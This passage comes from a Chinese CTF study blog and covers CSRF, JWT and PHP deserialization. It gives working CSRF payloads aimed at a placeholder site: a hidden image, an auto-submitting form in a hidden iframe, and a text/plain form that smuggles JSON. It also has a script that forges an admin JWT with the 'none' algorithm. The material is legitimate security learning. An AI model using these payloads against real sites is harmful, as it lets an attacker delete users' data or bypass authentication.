class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/109231974">[BUUCTF][FireshellCTF2020]URL TO PDF-CSDN博客</a></p>
<hr>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>CSRF(<strong>Cross-site request forgery</strong>)，跨站请求伪造，简单来说，就是伪造成admin身份，这样就可以拿到或者使用一些操作权限，获取敏感信息，借用一张图片：</p>
<p><img src="/img/lazy.gif" data-original="csrf1.png" alt=""></p>
<p>由上图可以看出：</p>
<ol>
<li>用户带着自己的凭证登入到目标网站，然后凭证被保存在本地</li>
<li>这个时候用户如果访问了恶意网站，且此时恶意网站向目标网站发送了请求，那么就会自动带上用户凭证访问（只是冒用，而不是直接获取你的凭证信息）</li>
<li>而目标网站因为用户凭证的原因，就不会识别成恶意请求，而是将其视为正常请求通过</li>
</ol>
<p>（这点看起来跟钓鱼网站那种转钱、盗号差不多）</p>
<h3 id="XSS-CSRF"><a href="#XSS-CSRF" class="headerlink" title="XSS+CSRF"></a>XSS+CSRF</h3><p>（以下突然发癫是因为写Ekko_note的WP的时候莫名觉醒了表达欲望）</p>
<p>（灵感来自<a target="_blank" rel="noopener" href="https://aszx87410.github.io/beyond-xss/ch4/csrf/#從偷懶的刪除功能開始介紹-csrf">跨站請求偽造 CSRF 一點就通 | Beyond XSS</a>）</p>
<p>（<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/17940811/example-of-silently-submitting-a-post-form-csrf">security - Example of silently submitting a POST FORM (CSRF) - Stack Overflow</a>）</p>
<p>假设现在存在一个网站，里面有文章，且存在删除按钮，其删除功能是这样的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;/delete?id=uid&#x27;</span>&gt;</span>Delete<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后网页后端验证：如果是用户发起的请求且该文章就是用户自己写的，那就执行删除命令</p>
<p>这看起来很安全的验证其实根本不安全，结合上面我们所说的CSRF，假设我们看A很不爽（bushi），很想删除他的文章，但是我们没有TA的认证，怎么办？通过观察A的喜好，我们发现他很喜欢点一些网站或者链接，某天我们突发奇想，自制了一个有着正常功能的网站，并且机缘巧合之下A也点进去了。我们将里面的提交按钮改成下面的形式：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://xxx.com/delete?id=uid&#x27;</span>&gt;</span>Begin!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>试想，如果A点击了这个开始按钮，就会像目标网站发送请求（带上凭证，一般你登网站都是一次过后一段时间内就都能直接登录的是吧），网站一看，欸是作者要求删除，且文章自己写的，网站就直接执行了，那么A的文章就这么被 ”自己“ 删了</p>
<p>但是你发现了，上面给的这个链接，如果A点了，那么会跳转到网站的界面，也就是TA眼睁睁看着自己的文章没了，那你的小心思不就立马被发现了吗。那我们换种方法：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://xxx.com/delete?id=uid&#x27;</span> <span class="attr">width</span>=<span class="string">&#x27;0&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;0&#x27;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;/test&#x27;</span>&gt;</span>Begin!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>将图片长宽都设置成了0，欸，这样前端就看不到这张图片了，但是它会偷偷发送请求出去（依旧是以A的身份），这样文章就会偷偷被删除了</p>
<p>但是网站管理员现在很聪明，TA早早知道了功能这么写的危害，所以TA将删除改成了POST请求，心想：这样总能避免图片和超链接攻击了吧</p>
<p>行走在[智识]命途的你，想到了POST请求，那么前端能实现POST请求的是什么呢，通过一番寻找，你发现了<code>&lt;form&gt;</code>这个标签，那么就很自然的写下了以下代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://xxx.com/delete&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Begin&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>但是你又发现，直接一个表单让A点是否有点过于《明目张胆》，你想隐藏掉并且也实现偷偷摸摸自动请求的功能呢，欸，你经过又一番搜索，发现了<code>&lt;iframe&gt;</code>标签：</p>
<p><code>&lt;iframe&gt;</code> 是 HTML 的“行内框架”元素，用来在当前页面里<strong>嵌入另一个独立的 HTML 文档</strong>。它相当于页中页，浏览器会为它创建一个新的浏览上下文（browsing context），即一个新的“小窗口”或“小 tab”，与父页面互不干扰</p>
<p>比如：<code>&lt;iframe src=&quot;https://example.com&quot;&gt;&lt;/iframe&gt;</code>，那么浏览器会再发起一次对 <code>https://example.com</code> 的请求，并把返回的 HTML 渲染在 iframe 占的区域里</p>
<p>好了，了解完了这标签的大概意思，你还是很疑惑，这这这不还是看得见吗。这时候<code>display:none</code>就赶来了，它告诉你：只要带上了我，A就看不到这块区域</p>
<p>现在，你明白了一切，反手写下以下代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf-frame&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&#x27;POST&#x27;</span> <span class="attr">action</span>=<span class="string">&#x27;https://xxx.com/delete&#x27;</span> <span class="attr">target</span>=<span class="string">&quot;csrf-frame&quot;</span> <span class="attr">id</span>=<span class="string">&quot;csrf-form&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;id&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;uid&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;submit&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;csrf-form&quot;</span>).<span class="title function_">submit</span>()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其功能如下：</p>
<ol>
<li>第一段隐藏 iframe，用来接收 POST 结果</li>
<li>第二段表单指向隐藏 iframe，实现“静默提交”</li>
<li>最后页面加载后立即自动提交表单</li>
</ol>
<p>欸，这样一来，你发现，虽然管理员改成了POST，但依旧有CSRF的问题，与此同时，管理员发现了这个问题，所以TA大手一挥，将接受信息的格式改成了JSON，因为对于<code>form</code>来说，只支持</p>
<ol>
<li><code>application/x-www-form-urlencoded</code></li>
<li><code>multipart/form-data</code></li>
<li><code>text/plain</code></li>
</ol>
<p>这三种<code>enctype</code>，但是如果解析json的话，一般都是<code>application/json</code>，有些服务器可能会拒绝上面发送的三种，但是另一些服务器比较宽容，它认为如果你的body是json格式的，enctype乱七八糟也没啥关系</p>
<p>所以这里引申出了name中包含json格式</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://xxx.com/delete&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;text/plain&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&#x27;&#123;&quot;id&quot;:uid, &quot;ignore_me&quot;:&quot;&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;test&quot;&#125;&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">value</span>=<span class="string">&quot;delete&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>聪明的你，发现了<code>form</code>产生<code>request body</code>的规则：（普普通通的表单）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/u&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;a&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;b&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;f&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果<code>enctype=application/x-www-form-urlencoded</code>，那么请求体就是</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /u HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">a=1&amp;b=2</span><br></pre></td></tr></table></figure>
<p>文件内容 <strong>不会被发送</strong>（浏览器只传文件名）</p>
<p><code>multipart/form-data</code>：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /u HTTP/1.1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">Content-Disposition: form-data; name=&quot;a&quot;</span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">Content-Disposition: form-data; name=&quot;f&quot;; filename=&quot;a.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">二进制</span>&gt;</span></span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW--</span><br></pre></td></tr></table></figure>
<p><code>text/plain</code>：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /u HTTP/1.1</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">a=1</span><br><span class="line">b=2</span><br></pre></td></tr></table></figure>
<p>到了这里你就发现了华点：对于<code>text/plain</code>来说，请求体是<code>name=value</code></p>
<p>所以最上面的表单提交后就会变成</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span>uid<span class="punctuation">,</span> <span class="attr">&quot;ignore_me&quot;</span><span class="punctuation">:</span><span class="string">&quot;=test&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>很神奇吧，聪明的你学了这些以后感觉对<code>XSS+CSRF</code>的理解有更深了呢，没准以后真能被博识尊瞥视（）</p>
<hr>
<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cjsblog/p/9277677.html">认识JWT - 废物大师兄 - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://jwt.io/">JSON Web Tokens - jwt.io</a> </p>
<p>重要工具就是<strong>C-JWT-Cracker</strong>（爆破Key）和<strong>无影</strong>（解码和构造），当然你用在线工具也是可以的（）</p>
<h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息</p>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ul>
<li><strong>Authorization</strong> (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用</li>
<li><strong>Information Exchange</strong> (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥/私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改</li>
</ul>
<h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><p>组成为：</p>
<p><strong>header.payload.signature</strong></p>
<p><strong>Header</strong></p>
<p>header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）</p>
<p><strong>Payload</strong></p>
<p>JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private</p>
<ul>
<li>Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等</li>
<li>Public claims : 可以随意定义</li>
<li>Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明</li>
</ul>
<p><strong>Signature</strong></p>
<p>为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥，签名算法是header中指定的那个，然对它们签名即可</p>
<p><strong>HMACSHA256(base64UrlEncode(header) + “.” + base64UrlEncode(payload), secret)</strong></p>
<p>下面给个例子：</p>
<p><img src="/img/lazy.gif" data-original="w29.png" alt=""></p>
<h3 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h3><p>（图扒上面那个博客里的）</p>
<p><img src="/img/lazy.gif" data-original="w30.png" alt=""></p>
<p>其实就类似Cookie</p>
<p>服务器上的受保护的路由将会检查<code>Authorization header</code>中的 JWT 是否有效，如果有效，则用户可以访问受保护的资源</p>
<h3 id="CTF中的应用"><a href="#CTF中的应用" class="headerlink" title="CTF中的应用"></a>CTF中的应用</h3><p>主要就是，你可以伪造成admin访问</p>
<h4 id="BUUCTF在线评测-EasyLogin"><a href="#BUUCTF在线评测-EasyLogin" class="headerlink" title="BUUCTF在线评测  EasyLogin"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[HFCTF2020]EasyLogin">BUUCTF在线评测 </a> EasyLogin</h4><p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;secretid&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1753186787</span></span><br><span class="line">&#125;,</span><br><span class="line">algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>).encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62107966/article/details/126801065">BUUCTF—-[HFCTF2020]EasyLogin保姆级详解。-CSDN博客</a> </p>
<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>这边主要是介绍Php</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11953">php反序列化完整总结-先知社区</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fish-pompom/p/11126473.html">PHP反序列化从初级到高级利用篇 - fish_pompom - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51295677/article/details/123425199">PHP之序列化与反序列化(POP链篇)_php反序列化pop链-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14104">PHP 反序列化基础完全解析-先知社区</a></p>
<h3 id="为什么需要序列化"><a href="#为什么需要序列化" class="headerlink" title="为什么需要序列化"></a>为什么需要序列化</h3><p>当需要将 PHP 中的复杂数据类型（如数组、对象等）存储到文件、数据库或其他存储介质中时，序列化可以把它们转换为一种可存储的线性字符串格式。以对象为例，如果不进行序列化，直接存储可能会面临数据结构难以保存、存储效率低下等问题。而序列化后，可以完整地保存对象的状态和结构，之后再通过反序列化恢复成原来的对象</p>
<p>简单来说，PHP 文件在执行结束以后就会将对象销毁，为了长久保存对象，就序列化，要用的时候就反序列化一下就好了</p>
<p><strong>E.g</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;miHoYo&#x27;</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$game</span> = <span class="string">&#x27;xingbugudi&#x27;</span>;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$object</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$object</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"> <span class="comment">//O:4:&quot;test&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;miHoYo&quot;;s:10:&quot;testgame&quot;;s:10:&quot;xingbugudi&quot;;s:6:&quot;*age&quot;;s:1:&quot;0&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>关键函数 serialize():将PHP中创建的对象，变成一个字符串</p>
<p>private属性序列化的时候格式是 <strong>%00类名%00成员名</strong></p>
<p>protected属性序列化的时候格式是 <strong>%00*%00成员名</strong></p>
<p>关键要点：</p>
<p>在Private 权限私有属性序列化的时候格式是 <strong>%00类名%00属性名</strong></p>
<p>在Protected 权限序列化的时候格式是 <strong>%00*%00属性名</strong></p>
<p>然后这里的Private和Protected不可以在外部调用更不能修改赋值，这个时候就需要利用构造函数以及在内部修改</p>
<p>你可能会发现这样一个问题，你这个类定义了那么多方法，怎么把对象序列化了以后全都丢了？你看你整个序列化的字符串里面全是属性，就没有一个方法，这是为啥？</p>
<p><strong>序列化只序列化属性，不序列化方法</strong></p>
<ul>
<li>反序列化的时候需要依托环境，因为不序列化方法，所以不能脱离作用域（类似解压缩）</li>
<li>反序列化是依托属性来进行攻击</li>
</ul>
<hr>
<h3 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h3><p>PHP 反序列化漏洞又叫做 PHP 对象注入漏洞，是因为程序对输入数据处理不当导致的</p>
<p>反序列化漏洞的成因在于代码中的 <code>unserialize()</code> 接收的参数可控，从上面的例子看，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击</p>
<p><strong>前提</strong></p>
<p>要用 <code>unserialize()</code> 函数，且进行反序列化的参数必须可控</p>
<p>在我们的攻击中，反序列化函数 unserialize() 是我们攻击的入口，也就是说，只要这个参数可控，我们就能传入任何的已经序列化的对象（只要这个类在当前作用域存在我们就可以利用），而不是局限于出现 unserialize() 函数的类的对象</p>
<p>但是反序列化只是控制了是属性，如果人家本身就是要反序列化后调用该类的某个安全的方法，我们又无法直接更改别人写好的代码，这时就素手无策了</p>
<p>这是就有魔法方法的出现了，魔法方法的调用是在该类序列化或者反序列化的同时自动完成的，只要里面出现了我们可以利用的函数，我们就可以操控其对象属性的值来操控函数，进而达到攻击目的</p>
<p>反序列化标识：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a - array</span><br><span class="line">b - boolean</span><br><span class="line">d - double</span><br><span class="line">i - integer</span><br><span class="line">o - common object</span><br><span class="line">r - reference</span><br><span class="line">s - string</span><br><span class="line">C - custom object</span><br><span class="line">O - class</span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - unicode string</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="魔法方法"><a href="#魔法方法" class="headerlink" title="魔法方法"></a>魔法方法</h3><p>对于php高版本来说，以下有些函数已被弃用，但是在CTF中仍会出现（）</p>
<h4 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h4><p>当对不可访问（比如私有、受保护或者未定义）的类属性调用 <code>isset()</code> 或者 <code>empty()</code> 函数时，<code>__isset()</code> 方法会被自动调用。它允许你自定义当检查这些不可直接访问属性是否存在时的行为（就是布尔类型，看括号里的存不存在）</p>
<p>假设有一个 <code>Person</code> 类：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 检查属性是否存在</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;张三&#x27;</span>, <span class="number">20</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">isset</span>(<span class="variable">$person</span>-&gt;name)); <span class="comment">// 通过 __isset() 方法间接检查，结果为 bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">isset</span>(<span class="variable">$person</span>-&gt;address)); <span class="comment">// 结果为 bool(false)，因为 address 属性不存在</span></span><br></pre></td></tr></table></figure>
<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h4><ul>
<li><p>与 <code>__sleep()</code> 相对应，当对象被反序列化时，<code>__wakeup()</code> 魔术方法会被自动调用</p>
</li>
<li><p>主要用于在反序列化时重新初始化对象可能需要的资源。例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ResourceHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$resource</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;resource = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;resource);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&quot;resource&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;resource = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    